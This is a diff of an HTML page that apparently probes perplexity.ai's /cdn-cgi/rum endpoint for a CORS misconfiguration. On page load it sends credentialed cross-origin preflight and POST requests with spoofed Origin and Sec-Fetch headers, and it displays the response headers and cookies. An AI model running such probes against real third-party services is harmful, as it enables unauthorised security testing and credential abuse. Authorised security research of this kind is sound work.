@@ -1,89 +1,75 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Test Suite</title>
-    <style>
-        body { font-family: Arial, sans-serif; padding: 20px; }
-        .test-button { 
-            margin: 10px;
-            padding: 10px 20px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-        .result { 
-            margin: 10px;
-            padding: 10px;
-            border: 1px solid #ccc;
-            background-color: #f8f9fa;
-        }
-    </style>
+    <title>CORS Test</title>
 </head>
 <body>
-    <h1>CORS Bypass Test Suite</h1>
-    <div>
-        <button class="test-button" onclick="runPreflightTest()">1. Test Preflight</button>
-        <button class="test-button" onclick="runPostTest()">2. Test POST</button>
-        <button class="test-button" onclick="runHeadersTest()">3. Test Headers</button>
-    </div>
-    <div id="result" class="result">Results will appear here...</div>
+    <h2>CORS Vulnerability Test</h2>
+    <div id="result"></div>
 
     <script>
-    async function runPreflightTest() {
+    async function testCORS() {
+        // First, send preflight
         try {
-            const response = await fetch('https://perplexity.ai/cdn-cgi/rum', {
+            const preflight = await fetch('https://perplexity.ai/cdn-cgi/rum', {
                 method: 'OPTIONS',
                 credentials: 'include',
                 headers: {
                     'Access-Control-Request-Method': 'POST',
-                    'Access-Control-Request-Headers': 'content-type',
+                    'Access-Control-Request-Headers': 'content-type,sec-ch-ua,sec-ch-ua-mobile,sec-ch-ua-platform',
                     'Origin': 'https://thunderanon.github.io'
                 }
             });
             
-            document.getElementById('result').innerHTML = `
-                <h3>Preflight Test Results:</h3>
-                <pre>
-Status: ${response.status}
-Headers: ${JSON.stringify([...response.headers], null, 2)}
-                </pre>
-            `;
-        } catch (error) {
-            document.getElementById('result').innerHTML = `
-                <h3>Preflight Test Error:</h3>
-                <pre>${error.message}</pre>
-            `;
-        }
-    }
+            console.log('Preflight response:', preflight);
 
-    async function runPostTest() {
-        const payload = {
-            "memory": {
-                "totalJSHeapSize": 11401845,
-                "usedJSHeapSize": 7164829,
-                "jsHeapSizeLimit": 2172649472
-            },
-            "resources": [],
-            "referrer": "",
-            "eventType": 1,
-            "firstPaint": 1454.425000011921
-        };
+            // If preflight successful, send actual request
+            const payload = {
+                "memory": {
+                    "totalJSHeapSize": 11401845,
+                    "usedJSHeapSize": 7164829,
+                    "jsHeapSizeLimit": 2172649472
+                },
+                "resources": [],
+                "referrer": "",
+                "eventType": 1,
+                "firstPaint": 1454.425000011921,
+                "firstContentfulPaint": 1454.425000011921,
+                "startTime": Date.now(),
+                "versions": {
+                    "fl": "2024.10.4",
+                    "js": "2024.6.1",
+                    "timings": 2
+                },
+                "pageloadId": "8caf78f2-0403-4ce6-a56e-751da5669c3d",
+                "location": "https://perplexity.ai/",
+                "nt": "navigate",
+                "serverTimings": [],
+                "dt": "",
+                "siteToken": "92730c73a9e747fbb6a25e1d6657122d",
+                "st": 2
+            };
 
-        try {
             const response = await fetch('https://perplexity.ai/cdn-cgi/rum', {
                 method: 'POST',
                 credentials: 'include',
                 headers: {
                     'Content-Type': 'application/json',
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-GB,en;q=0.9',
                     'Origin': 'https://thunderanon.github.io',
-                    'Accept': '*/*'
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Ch-Ua': '"Chromium";v="129", "Not=A?Brand";v="8"',
+                    'Sec-Ch-Ua-Mobile': '?0',
+                    'Sec-Ch-Ua-Platform': '"macOS"'
                 },
                 body: JSON.stringify(payload)
             });
-            
+
             document.getElementById('result').innerHTML = `
-                <h3>POST Test Results:</h3>
+                <h3>Test Results:</h3>
                 <pre>
 Status: ${response.status}
 Headers: ${JSON.stringify([...response.headers], null, 2)}
@@ -92,63 +78,15 @@ Cookies: ${document.cookie}
             `;
         } catch (error) {
             document.getElementById('result').innerHTML = `
-                <h3>POST Test Error:</h3>
+                <h3>Error:</h3>
                 <pre>${error.message}</pre>
             `;
+            console.error('Full error:', error);
         }
     }
 
-    async function runHeadersTest() {
-        const headers = {
-            'standard': {
-                'Content-Type': 'application/json',
-                'Origin': 'https://thunderanon.github.io'
-            },
-            'modified': {
-                'Content-Type': 'application/json;charset=UTF-8',
-                'Origin': 'https://thunderanon.github.io'
-            },
-            'extended': {
-                'Content-Type': 'application/json',
-                'Origin': 'https://thunderanon.github.io',
-                'Accept': '*/*',
-                'Accept-Language': 'en-US,en;q=0.5',
-                'Accept-Encoding': 'gzip, deflate, br'
-            }
-        };
-
-        let results = '';
-        for (let [testName, headerSet] of Object.entries(headers)) {
-            try {
-                const response = await fetch('https://perplexity.ai/cdn-cgi/rum', {
-                    method: 'POST',
-                    credentials: 'include',
-                    headers: headerSet,
-                    body: JSON.stringify({
-                        "eventType": 1,
-                        "memory": {"totalJSHeapSize": 11401845}
-                    })
-                });
-                
-                results += `
-                    <h4>Test: ${testName}</h4>
-                    <pre>
-Status: ${response.status}
-Headers: ${JSON.stringify([...response.headers], null, 2)}
-                    </pre>
-                `;
-            } catch (error) {
-                results += `
-                    <h4>Test: ${testName}</h4>
-                    <pre>Error: ${error.message}</pre>
-                `;
-            }
-        }
-        document.getElementById('result').innerHTML = `
-            <h3>Headers Test Results:</h3>
-            ${results}
-        `;
-    }
+    // Run test immediately
+    testCORS();
     </script>
 </body>
 </html>
